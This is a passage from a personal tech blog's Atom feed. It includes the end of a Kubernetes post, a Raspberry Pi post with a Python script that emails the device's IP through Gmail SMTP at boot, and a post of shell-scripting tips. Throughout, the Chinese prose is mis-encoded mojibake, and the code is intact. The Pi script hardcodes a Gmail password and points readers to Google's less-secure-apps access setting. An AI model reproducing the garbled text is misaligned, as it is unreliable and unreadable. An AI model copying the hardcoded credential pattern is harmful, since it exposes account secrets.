ä¸­ï¼‰å¾Œé¢çš„å®¹å™¨åŸä¾†æ›æ‰äº†ï¼</p><h2 id="æ›´æ›´æ›´å¼·å¤§çš„é«˜å¯ç”¨æ€§"><a href="#æ›´æ›´æ›´å¼·å¤§çš„é«˜å¯ç”¨æ€§" class="headerlink" title="æ›´æ›´æ›´å¼·å¤§çš„é«˜å¯ç”¨æ€§"></a>æ›´æ›´æ›´å¼·å¤§çš„é«˜å¯ç”¨æ€§</h2><p>ä»¥ä¸Šä¾‹å­ä½¿ç”¨ <code>minikube</code> ä¾†å¯¦é©—ï¼Œåªæœ‰ä¸€å€‹ç¯€é»ã€‚çœŸå¯¦æƒ…æ³ç”šè‡³å¯ä»¥æŠŠå¥½å¹¾å°æ©Ÿå™¨å…¨éƒ¨çµ¦ <code>k8s</code> é€²è¡Œç®¡ç†ã€‚é€™æ¨£å­ç”šè‡³é€£æ©Ÿå™¨æ›æ‰éƒ½å¯ä»¥ä¿è­‰æœå‹™ä¸ä¸­æ–·ï¼Œé€™æ‰æ˜¯çœŸæ­£çš„é«˜å¯ç”¨æ€§ï¼</p><p>æ–‡ä¸­é€éä¸€å€‹ä¾‹å­è®“è®€è€…äº†è§£åˆ° <code>k8s</code> çš„ç”¨è™•ï¼Œä½†æ˜¯æ²’æœ‰è§£é‡‹å¾ˆå¤šå•é¡Œï¼Œåƒæ˜¯ï¼š</p><ul><li>ç‚ºä»€éº¼å»ºç«‹çš„æ˜¯ <code>pod</code> ä¸æ˜¯ <code>container</code>ï¼Ÿ</li><li>ç‚ºä»€éº¼éœ€è¦ <code>expose</code>ï¼Ÿ</li><li><code>minikube</code> æ˜¯ä»€éº¼ï¼Ÿ</li></ul><p>åŸå› åœ¨æ–¼æˆ‘èªç‚ºå…ˆé«”é©—ä¸€æ¬¡é€™å€‹æŠ€è¡“çš„æ•ˆæœå†å»å­¸ç¿’é€™å€‹æŠ€è¡“ç´°è§£ï¼Œæœ‰æ™‚å€™å¯èƒ½æœƒæ¯”èµ·ç›´æ¥å»è¨˜æ†¶é‚£äº›ç¡¬ç”Ÿç”Ÿçš„åè©ä¾†å¾—æœ‰æ•ˆæœï¼Œæ‰€ä»¥çœ‹å®Œé€™ç¯‡æ–‡ç« ä¹‹å¾Œï¼Œå¦‚æœä¸å¤ªæ‡‚è£¡é¢çš„ç´°è§£å¯ä»¥å†å»çœ‹å®˜æ–¹æ–‡ä»¶æˆ–æ˜¯æŸ¥é–±å…¶ä»– <code>k8s</code> çš„æ¦‚å¿µè¬›è§£æ–‡ç« ã€‚</p><p>çœ‹å®Œä¹‹å¾Œå†å›ä¾†è‡ªå·±ç©éä¸€æ¬¡ï¼Œæˆ‘ç›¸ä¿¡æœƒæœ‰ä¸ä¸€æ¨£çš„æ„Ÿè¦ºçš„ï¼</p></body></html>]]></content>
    
    <summary type="html">
    
      &lt;html&gt;&lt;head&gt;&lt;/head&gt;&lt;body&gt;&lt;/body&gt;&lt;/html&gt;
    
    </summary>
    
    
      <category term="kubernetes" scheme="https://blog.yiyu0x.org/tags/kubernetes/"/>
    
  </entry>
  
  <entry>
    <title>Raspberry Pi é–‹æ©Ÿæ™‚è‡ªå‹•å¯„é€ IP è¨­å®š</title>
    <link href="https://blog.yiyu0x.org/2019/12/15/"/>
    <id>https://blog.yiyu0x.org/2019/12/15/</id>
    <published>2019-12-15T08:51:07.000Z</published>
    <updated>2025-04-12T20:59:43.588Z</updated>
    
    <content type="html"><![CDATA[<html><head></head><body><h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><p>åœ¨ä½¿ç”¨ Raspberry Piï¼ˆä»¥ä¸‹ç°¡ç¨±ç‚º Piï¼‰æ™‚ï¼Œå¦‚æœæ¯ä¸€æ¬¡éƒ½è¦ä½”ç”¨ä¸€å€‹é›»è…¦çš„ USB port éå¸¸ä¸æ–¹ä¾¿ï¼Œè€Œä¸”é›»è…¦è¼¸å‡ºé›»å£“ä¸ä¸€å®šå¤ ï¼Œå¦‚æœæ¢ä»¶å…è¨±ï¼Œæˆ‘å€‘æœƒå¸Œæœ›å°‡ Pi ç”¨è®Šå£“å™¨ç¨ç«‹æ’åœ¨æ’åº§ä¸Šï¼Œå†ä½¿ç”¨ SSH é€™é¡çš„å·¥å…·é ç«¯æ“ä½œã€‚</p><p>ä½†æ˜¯è¦ SSH å‰å¿…é ˆè¦çŸ¥é“ IPï¼Œæˆ‘å€‘å¸Œæœ›è®“ Pi åœ¨é–‹æ©Ÿå®Œç•¢å¾Œè‡ªå‹•å°‡ IP ç™¼é€è‡³è‡ªå·±çš„ä¿¡ç®±ã€‚å¦‚æ­¤ä¸€ä¾†ä¹‹å¾Œåªè¦ Pi æœ‰å–å¾— IP çš„è©±å°±æœƒè‡ªå‹•å¯„ä¿¡ï¼Œæˆ‘å€‘ä¸å¿…å†é€é USB ç·šæä»¥åŠ screen æŒ‡ä»¤é€²è¡Œé€£ç·šã€‚</p><h2 id="å¯„ä¿¡æ–¹å¼"><a href="#å¯„ä¿¡æ–¹å¼" class="headerlink" title="å¯„ä¿¡æ–¹å¼"></a>å¯„ä¿¡æ–¹å¼</h2><p>è¦å¯„ä¿¡çš„æ–¹å¼æœ‰å…©ç¨®ï¼Œä¸€ç¨®æ˜¯ç›´æ¥æ¶è¨­ SMTP server ä¾†å¯„ä¿¡ï¼Œä½†æ˜¯é€šå¸¸æ”¶ä¿¡æ–¹æœƒå› ç‚ºè©²ä¿¡ä»¶çš„ä¾†æºæ²’æœ‰ Domain Name è€Œä¸æ”¶ä¿¡ï¼ˆæƒ¡æ„éƒµä»¶ï¼‰ï¼Œæˆ–æ˜¯ç›´æ¥å°‡ä¿¡ç®±æ”¾ç½®åƒåœ¾ä¿¡ä»¶è™•ç†ï¼Œæ‰€ä»¥ä¸å»ºè­°æ­¤ç¨®æ–¹å¼ã€‚</p><p>ç¬¬äºŒç¨®æ–¹æ³•å‰‡æ˜¯åˆ©ç”¨ Gmail æä¾›çš„ SMTP server ä¾†å¯„ä¿¡ï¼ˆè¦è‡ªå‚™ Gmail å¸³è™Ÿï¼‰ã€‚è©²æ–¹å¼éœ€è¦å…ˆåˆ° <a href="https://myaccount.google.com/lesssecureapps" target="_blank" rel="noopener">Google ä½å®‰å…¨æ€§æ‡‰ç”¨ç¨‹å¼å­˜å–æ¬Š</a> å…è¨±ä½å®‰å…¨æ€§æ‡‰ç”¨ç¨‹å¼ä¾†å­˜å–ä½ çš„å¸³æˆ¶ï¼Œè«‹æ–Ÿé…Œä½¿ç”¨ã€‚</p><h2 id="å¯„ä¿¡è…³æœ¬"><a href="#å¯„ä¿¡è…³æœ¬" class="headerlink" title="å¯„ä¿¡è…³æœ¬"></a>å¯„ä¿¡è…³æœ¬</h2><p>è«‹å°‡ä»¥ä¸‹æ¬„ä½è‡ªè¡Œå¡«å…¥ï¼Œä¸¦ä¸”è³¦äºˆè©²è…³æœ¬åŸ·è¡Œæ¬Šé™ã€‚ï¼ˆå»ºè­°ä½¿ç”¨ Python2ï¼‰</p><ul><li>to</li><li>gmail_user</li><li>gmail_password</li></ul><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"><span class="keyword">import</span> smtplib</span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">from</span> email.mime.text <span class="keyword">import</span> MIMEText</span><br><span class="line"><span class="keyword">import</span> datetime</span><br><span class="line"></span><br><span class="line"><span class="comment"># Which email address want to send</span></span><br><span class="line">to = <span class="string">'XXX'</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Using specific gmail account</span></span><br><span class="line">gmail_user = <span class="string">'XXX'</span></span><br><span class="line">gmail_password = <span class="string">'XXX'</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># SMTP command</span></span><br><span class="line">smtpserver = smtplib.SMTP(<span class="string">'smtp.gmail.com'</span>, <span class="number">587</span>)</span><br><span class="line">smtpserver.ehlo()</span><br><span class="line">smtpserver.starttls()</span><br><span class="line">smtpserver.login(gmail_user, gmail_password)</span><br><span class="line">today = datetime.date.today()</span><br><span class="line"></span><br><span class="line"><span class="comment"># Linux Specific shell command</span></span><br><span class="line">arg=<span class="string">'ip route list'</span></span><br><span class="line">p=subprocess.Popen(arg,shell=<span class="literal">True</span>,stdout=subprocess.PIPE)</span><br><span class="line">data = p.communicate()</span><br><span class="line">split_data = data[<span class="number">0</span>].split()</span><br><span class="line">ipaddr = split_data[split_data.index(<span class="string">'src'</span>)+<span class="number">1</span>]</span><br><span class="line">my_ip = <span class="string">'Your ip is %s'</span> %  ipaddr</span><br><span class="line">msg = MIMEText(my_ip)</span><br><span class="line">msg[<span class="string">'Subject'</span>] = <span class="string">'IP For RaspberryPi on %s'</span> % today.strftime(<span class="string">'%b %d %Y'</span>)</span><br><span class="line">msg[<span class="string">'From'</span>] = gmail_user</span><br><span class="line">msg[<span class="string">'To'</span>] = to</span><br><span class="line">smtpserver.sendmail(gmail_user, [to], msg.as_string())</span><br><span class="line">smtpserver.quit()</span><br></pre></td></tr></tbody></table></figure><h2 id="é–‹æ©Ÿæ™‚åŸ·è¡Œ"><a href="#é–‹æ©Ÿæ™‚åŸ·è¡Œ" class="headerlink" title="é–‹æ©Ÿæ™‚åŸ·è¡Œ"></a>é–‹æ©Ÿæ™‚åŸ·è¡Œ</h2><p>åœ¨ <code>/etc/rc.local</code> ä¸­åŸ·è¡Œ Scriptï¼ˆmail.pyï¼‰</p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">_IP=$(hostname -I) || <span class="literal">true</span></span><br><span class="line"><span class="keyword">if</span> [ <span class="string">"<span class="variable">$_IP</span>"</span> ]; <span class="keyword">then</span></span><br><span class="line">  <span class="built_in">printf</span> <span class="string">"My IP address is %s\n"</span> <span class="string">"<span class="variable">$_IP</span>"</span></span><br><span class="line">  /home/pi/mail.py</span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">exit</span> 0</span><br></pre></td></tr></tbody></table></figure></body></html>]]></content>
    
    <summary type="html">
    
      &lt;html&gt;&lt;head&gt;&lt;/head&gt;&lt;body&gt;&lt;/body&gt;&lt;/html&gt;
    
    </summary>
    
    
      <category term="raspberry_pi" scheme="https://blog.yiyu0x.org/tags/raspberry-pi/"/>
    
  </entry>
  
  <entry>
    <title>Shell Script ä¸­é‚£äº›éŒ¯éçš„äº‹</title>
    <link href="https://blog.yiyu0x.org/2019/11/28/"/>
    <id>https://blog.yiyu0x.org/2019/11/28/</id>
    <published>2019-11-28T05:36:58.000Z</published>
    <updated>2025-04-12T20:59:43.588Z</updated>
    
    <content type="html"><![CDATA[<html><head></head><body><h1 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h1><p>Shell Script æƒ³å¿…å¤§å®¶éƒ½æœ‰ä½¿ç”¨éï¼Œå³ä½¿æ²’æœ‰çœŸçš„å¯« scriptï¼Œå¤šå°‘ä¹Ÿæœƒæœ‰åœ¨ command line ä¸­é€é pipe æˆ–æ˜¯ and æ¢ä»¶å¥ä¾†å°‡ä¸åŒçš„æŒ‡ä»¤çµåˆåœ¨ä¸€èµ·çš„ç¶“é©—ã€‚</p><p>ä¹Ÿå› ç‚º Shell å¦‚æ­¤å¹³å‡¡ï¼Œè²¼è¿‘ä¸€èˆ¬ç’°å¢ƒï¼Œåè€Œå¾ˆå°‘æœ‰äººèŠ±æ™‚é–“å»èªçœŸäº†è§£é Shellã€‚æˆ‘è‡ªå·±ä¹Ÿæ˜¯é€™ç¨®äººï¼Œæ–¼æ˜¯è¿‘æœŸè®€äº†ã€Šç²¾é€š shell ç¨‹å¼è¨­è¨ˆ ç¬¬å››ç‰ˆã€‹å¾Œï¼Œè¨˜éŒ„äº†ä¸€äº›è‡ªå·±å¾ä¾†æ²’æœ‰äº†è§£éçš„ç´°ç¯€ã€‚</p><h2 id="æª”æ¡ˆåç¨±æ›¿æ›"><a href="#æª”æ¡ˆåç¨±æ›¿æ›" class="headerlink" title="æª”æ¡ˆåç¨±æ›¿æ›"></a>æª”æ¡ˆåç¨±æ›¿æ›</h2><h3 id="å­—å…ƒ"><a href="#å­—å…ƒ" class="headerlink" title="* å­—å…ƒ"></a>* å­—å…ƒ</h3><p>åœ¨ Shell ä¸­ï¼ˆæ­¤ç¯‡æ–‡ç« ç”¨ Bash ä¾†ç•¶ä¾‹å­ï¼‰ï¼Œ<code>*</code> æœƒè¢«è½‰è­¯æˆè©²ç›®éŒ„ä¸‹æ‰€æœ‰æª”æ¡ˆçš„åç¨±ã€‚ï¼ˆé€™ä»¶äº‹æ˜¯ç”± Shell é å…ˆè™•ç†å¥½ã€‚ï¼‰</p><p>ç•¶ <code>echo *</code> æ™‚ï¼Œå¯¦éš›ä¸Šæœƒå…ˆæŠŠ * æ›¿æ›æˆæª”åï¼ˆå‡å¦‚æœ‰ a b c ä¸‰å€‹æª”æ¡ˆï¼‰ï¼Œç„¶å¾ŒåŸ·è¡Œ <code>echo a b c</code> å°å‡º <code>a b c</code>ã€‚</p><p>ä»¥ echo æŒ‡ä»¤çš„è§’åº¦ï¼Œæ˜¯æ²’æœ‰è¾¦æ³•è¾¨åˆ¥ a b c æ˜¯ç”± <code>*</code> æ›¿æ›è€Œä¾†ï¼Œecho åªçŸ¥é“è‡ªå·±æ”¶åˆ°ä¸‰å€‹åƒæ•¸åˆ†åˆ¥ç‚º a, b, cã€‚</p><h3 id="å­—å…ƒ-1"><a href="#å­—å…ƒ-1" class="headerlink" title="? å­—å…ƒ"></a>? å­—å…ƒ</h3><p>? å¯ä»¥å°æ‡‰å–®ä¸€å­—å…ƒï¼Œä¾‹å¦‚ ?? å¯ä»¥å°æ‡‰å‡ºå…¨éƒ¨å‰›å¥½å…©å­—å…ƒçš„æª”åï¼Œå¦‚æœæƒ³è¦åŒ¹é…å…©å€‹å­—å…ƒä»¥ä¸Šï¼ˆåŒ…å«å…©å€‹å­—å…ƒï¼‰çš„æª”åå¯ä»¥ä½¿ç”¨ ??*</p><p>è©²é…å°æ–¹å¼èˆ‡ Regular Expression é¡ä¼¼ï¼Œä½†ä¸¦é Regular Expressionã€‚</p><h2 id="è¼¸å…¥é‡å°å‘"><a href="#è¼¸å…¥é‡å°å‘" class="headerlink" title="è¼¸å…¥é‡å°å‘"></a>è¼¸å…¥é‡å°å‘</h2><p>åœ¨ä¸€è¡ŒæŒ‡ä»¤é–‹å§‹åŸ·è¡Œæ™‚ï¼Œå…¶å¯¦ Shell å·²ç¶“é»˜é»˜å¹«æˆ‘å€‘åšäº†ä¸€äº›äº‹æƒ…ã€‚</p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">wc -l users <span class="comment"># 5 s.sh</span></span><br><span class="line">wc -l < s.sh <span class="comment"># 5</span></span><br></pre></td></tr></tbody></table></figure><p>ä»¥ä¸Šå…©è€…çš„è¼¸å‡ºä¸¦ä¸ç›¸åŒï¼Œå·®ç•°åœ¨æ–¼å¾Œè€…æ˜¯é€éæ¨™æº–è¼¸å…¥å‚³å…¥ï¼Œwc ç¨‹å¼ä¸¦ç„¡æ³•å¾—çŸ¥æ˜¯å“ªä¸€å€‹æª”æ¡ˆå‚³é€²ä¾†çš„å…§å®¹ï¼Œæ‰€ä»¥ç„¡å¾å¾—çŸ¥æª”åã€‚</p><h2 id="è®Šæ•¸ç›¸é—œ"><a href="#è®Šæ•¸ç›¸é—œ" class="headerlink" title="è®Šæ•¸ç›¸é—œ"></a>è®Šæ•¸ç›¸é—œ</h2><h3 id="è®Šæ•¸"><a href="#è®Šæ•¸" class="headerlink" title="è®Šæ•¸"></a>è®Šæ•¸</h3><ul><li>è®Šæ•¸å‹æ…‹åªæœ‰å­—ä¸²è®Šæ•¸</li><li>å®£å‘Šè®Šæ•¸æ™‚ = è™Ÿå·¦å³ä¸èƒ½æœ‰ç©ºæ ¼</li></ul><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">a = hello <span class="comment"># éŒ¯èª¤</span></span><br><span class="line">a=hello   <span class="comment"># æ­£ç¢º</span></span><br></pre></td></tr></tbody></table></figure><ul><li>ç•¶å­—ä¸²ä»£æœ‰ç©ºæ ¼æ™‚ï¼Œè¦ç”¨ <code>'</code> æˆ– <code>"</code> ä¾†å¤¾ä½å­—ä¸²</li><li>å–®å¼•è™Ÿå¤¾ä½çš„å…§å®¹ä¸æœƒå†é€²è¡Œè½‰è­¯ï¼Œé›™å¼•è™Ÿçš„å…§å®¹æœƒå†é€²è¡Œè½‰è­¯</li><li>$ å­—è™Ÿç”¨ä¾†å–å€¼ï¼ˆshell æœƒé€²è¡Œæ›¿æ›ï¼‰</li></ul><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">var1=hi</span><br><span class="line"><span class="built_in">echo</span> <span class="string">'$var1'</span> <span class="comment"># $var1</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">"<span class="variable">$var1</span>"</span> <span class="comment"># hi</span></span><br></pre></td></tr></tbody></table></figure><h3 id="unset"><a href="#unset" class="headerlink" title="unset"></a>unset</h3><p>unset æ˜¯ä¸€å€‹å¥½ç”¨çš„æŒ‡ä»¤ï¼Œç”¨ä¾†æŠŠè®Šæ•¸å–æ¶ˆè¨­ç½®ï¼Œä¹Ÿå¯ä»¥å°‡ function, alias çš„è¨­å®šå–æ¶ˆï¼š</p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">msg=hello</span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$msg</span> <span class="comment"># hello</span></span><br><span class="line"><span class="built_in">unset</span> msg</span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$msg</span> <span class="comment">#</span></span><br></pre></td></tr></tbody></table></figure><p>é‚„æœ‰ä¸€ç¨®å–æ¶ˆçš„æ–¹å¼ç‚ºæŒ‡å®šç©ºå€¼ï¼š</p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">msg=hello</span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$msg</span> <span class="comment"># hello</span></span><br><span class="line">msg=      <span class="comment"># ä¸æŒ‡å®š</span></span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$msg</span> <span class="comment">#</span></span><br></pre></td></tr></tbody></table></figure><ul><li>å–æ¶ˆ alias : <code>unset -a <alias-name></code></li><li>å–æ¶ˆ function : <code>unset -f <func-name></code></li></ul><h3 id="â€œ-varâ€-èˆ‡-var-çš„å·®ç•°"><a href="#â€œ-varâ€-èˆ‡-var-çš„å·®ç•°" class="headerlink" title="â€œ$varâ€ èˆ‡ $var çš„å·®ç•°"></a>â€œ$varâ€ èˆ‡ $var çš„å·®ç•°</h3><p>ï¼ˆå‡è¨­ç›®éŒ„ä¸‹æœ‰ a b c ä¸‰å€‹æª”æ¡ˆï¼‰</p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">var=*</span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$var</span>    <span class="comment"># a b c</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">"<span class="variable">$var</span>"</span>  <span class="comment"># *</span></span><br></pre></td></tr></tbody></table></figure><p>å› ç‚º <code>$var</code> æœƒæ›¿æ›æˆ <code>*</code> ï¼Œæ‰€ä»¥ <code>echo $var</code> æœƒå…ˆè¢« Shell æ›¿æ›æˆ <code>echo *</code> å†æ›¿æ›æˆ <code>echo a b c</code>ã€‚</p><p>ç„¶è€Œ <code>echo "$var"</code> æœ€å¾Œåƒ…æœƒè¢«æ›¿æ›æˆ <code>echo "*"</code> è€Œå°å‡º <code>*</code>ã€‚</p><p>ï¼ˆé›™å¼•è™Ÿåªæœƒè½‰è­¯è®Šæ•¸ï¼Œä¸æœƒè½‰è­¯ <code>*</code> ã€‚ï¼‰</p><p>ç”±ä¸Šè¿°ä¾‹å­å¯çŸ¥ï¼Œç‚ºä½•æ¯”è¼ƒå¥½çš„å¯«æ³•æ˜¯åœ¨å°å‡ºè®Šæ•¸æ™‚å¤–é¢å†åŒ…ä¸€å±¤é›™å¼•è™Ÿã€‚</p><h3 id="å‘½ä»¤æ›¿æ›ï¼š-èˆ‡"><a href="#å‘½ä»¤æ›¿æ›ï¼š-èˆ‡" class="headerlink" title="å‘½ä»¤æ›¿æ›ï¼š`` èˆ‡ $()"></a>å‘½ä»¤æ›¿æ›ï¼š`` èˆ‡ $()</h3><p>é€™å…©å€‹åŒ…è£¹å­—ä¸²çš„æ–¹å¼æœƒè®“å­—ä¸²å…§å®¹ç•¶ä½œæŒ‡ä»¤ä¾†åŸ·è¡Œï¼š</p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">var=`date`</span><br><span class="line">var2=$(date)</span><br><span class="line"><span class="built_in">echo</span> <span class="string">"<span class="variable">$var</span>"</span>  <span class="comment"># Mon Nov 25 16:56:47 CST 2019</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">"<span class="variable">$var2</span>"</span> <span class="comment"># Mon Nov 25 16:56:47 CST 2019</span></span><br></pre></td></tr></tbody></table></figure><p>å·®ç•°åœ¨æ–¼ <code>$()</code> æ˜¯æ–°çš„æ–¹å¼ï¼Œå…©å€‹ ` å‰‡æ˜¯èˆŠçš„æ–¹å¼</p><h2 id="å¸¸ç”¨æŒ‡ä»¤ä»¥åŠè¢«å¿½ç•¥çš„äº‹"><a href="#å¸¸ç”¨æŒ‡ä»¤ä»¥åŠè¢«å¿½ç•¥çš„äº‹" class="headerlink" title="å¸¸ç”¨æŒ‡ä»¤ä»¥åŠè¢«å¿½ç•¥çš„äº‹"></a>å¸¸ç”¨æŒ‡ä»¤ä»¥åŠè¢«å¿½ç•¥çš„äº‹</h2><h3 id="echo"><a href="#echo" class="headerlink" title="echo"></a>echo</h3><p>echo æŒ‡ä»¤æœƒç„¡è¦–ç©ºæ ¼ï¼ˆé™¤éä½ ç”¨å¼•è™Ÿå¤¾ä½å­—ä¸²ï¼‰å°‡ç©ºæ ¼ç•¶ä½œåˆ†é›¢ä¸åŒåƒæ•¸çš„åˆ†éš”ç¬¦è™Ÿï¼š</p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> a b  c    d   e <span class="comment"># a b c d e</span></span><br></pre></td></tr></tbody></table></figure><p><code>-e</code> åƒæ•¸ç”¨ä¾†é–‹å•Ÿè½‰è­¯åŠŸèƒ½</p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> -e <span class="string">"123\n"</span> <span class="comment"># 123</span></span><br><span class="line">                <span class="comment">#</span></span><br><span class="line"><span class="comment"># å› ç‚º echo æœ¬èº«æœƒæ›è¡Œï¼Œæ‰€ä»¥ \n æœƒè®“ output æœ‰å…©å€‹æ›è¡Œ</span></span><br><span class="line"><span class="comment"># \c å¯ä»¥è®“ echo å»é™¤æ›è¡Œå­—å…ƒ</span></span><br><span class="line"><span class="built_in">echo</span> -e <span class="string">"123\c"</span> <span class="comment"># 123 04:17:55 yiyu@afra tmp â†’</span></span><br><span class="line"><span class="comment"># shell çš„ PS1 æœƒç·Šè²¼åœ¨ output ä¹‹å¾Œï¼ˆå› ç‚ºæ²’æœ‰æ›è¡Œå­—å…ƒï¼‰</span></span><br></pre></td></tr></tbody></table></figure><h3 id="ls"><a href="#ls" class="headerlink" title="ls"></a>ls</h3><p>ä½¿ç”¨ ls æŒ‡ä»¤ï¼Œæœƒåˆ—å‡ºè©²ç›®éŒ„ä¸‹æ‰€æœ‰æª”æ¡ˆï¼Œä½†ä¸æ˜¯ä¸€å€‹æª”æ¡ˆä¸€è¡Œï¼Œæƒ³è¦ä¸€å€‹æª”æ¡ˆä¸€è¡Œå°å‡ºï¼Œå¯ä»¥ä½¿ç”¨ <code>ls -1</code></p><h2 id="wc"><a href="#wc" class="headerlink" title="wc"></a>wc</h2><p>ç”¨ä¾†æŸ¥çœ‹æª”æ¡ˆçš„å…§å®¹åŒ…è¡Œå¹¾åˆ—ã€å¹¾å€‹å–®å­—ã€å¹¾å€‹å­—å…ƒã€‚ä¸å¹¸çš„æ˜¯ wc çš„çµæœé–‹é ­éƒ½æœƒæœ‰ä¸€å€‹ç©ºç™½ï¼Œå¯ä»¥ä½¿ç”¨ sed å°‡å®ƒå‰”é™¤ï¼š</p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">wc backup.sh</span><br><span class="line"><span class="comment"># 4  9 82 backup.sh</span></span><br><span class="line">wc backup.sh | sed <span class="string">'s/^ //g'</span></span><br><span class="line"><span class="comment">#4  9 82 backup.sh</span></span><br></pre></td></tr></tbody></table></figure><h3 id="sort-è¦†è“‹è‡ªå·±"><a href="#sort-è¦†è“‹è‡ªå·±" class="headerlink" title="sort è¦†è“‹è‡ªå·±"></a>sort è¦†è“‹è‡ªå·±</h3><p>sort åƒè¬ä¸è¦ç›´æ¥é‡æ–°å°å…¥è‡ªå·±ï¼Œå¦å‰‡æœƒæ¸…é™¤è©²æª”æ¡ˆå…§å®¹ï¼š</p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">cat a.txt</span><br><span class="line"><span class="comment"># 1</span></span><br><span class="line"><span class="comment"># 2</span></span><br><span class="line"><span class="comment"># 3</span></span><br><span class="line">sort a.txt > a.txt</span><br><span class="line">cat a.txt</span><br><span class="line"><span class="comment">#</span></span><br></pre></td></tr></tbody></table></figure><p>å¦‚æœæœ‰é€™å€‹éœ€æ±‚ï¼Œå¯ä»¥åŠ ä¸Š <code>-o</code> åƒæ•¸ï¼š</p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">cat a.txt</span><br><span class="line"><span class="comment"># 1</span></span><br><span class="line"><span class="comment"># 2</span></span><br><span class="line"><span class="comment"># 3</span></span><br><span class="line">sort a.txt -o a.txt</span><br><span class="line">cat a.txt</span><br><span class="line"><span class="comment"># 1</span></span><br><span class="line"><span class="comment"># 2</span></span><br><span class="line"><span class="comment"># 3</span></span><br></pre></td></tr></tbody></table></figure><h2 id="åƒæ•¸"><a href="#åƒæ•¸" class="headerlink" title="åƒæ•¸"></a>åƒæ•¸</h2><h3 id="ç‰¹æ®Šè®Šæ•¸"><a href="#ç‰¹æ®Šè®Šæ•¸" class="headerlink" title="ç‰¹æ®Šè®Šæ•¸"></a>ç‰¹æ®Šè®Šæ•¸</h3><ul><li><code>$#</code> æœƒæ›¿æ›æˆåƒæ•¸æ•¸é‡</li><li><code>$*</code> æœƒæ›¿æ›æˆå…¨éƒ¨åƒæ•¸</li><li>æˆ‘å€‘éƒ½çŸ¥é“ $1, $2 ç”¨ä¾†æŒ‡å®šä¸åŒåƒæ•¸ï¼Œä½†å‡å¦‚æ˜¯åƒæ•¸ 10ï¼Œ$10 æœƒè¢«è½‰è­¯æˆ <code>$1</code> ä»¥åŠ <code>0</code>ï¼Œé€™æ™‚å€™å°±éœ€è¦ <code>${n}</code> æ ¼å¼ä¾†æŒ‡å®šåƒæ•¸ 10ï¼Œ <code>${10}</code>ã€‚</li></ul><h2 id="æ±ºç­–"><a href="#æ±ºç­–" class="headerlink" title="æ±ºç­–"></a>æ±ºç­–</h2><h3 id="é€€å‡ºç‹€æ…‹"><a 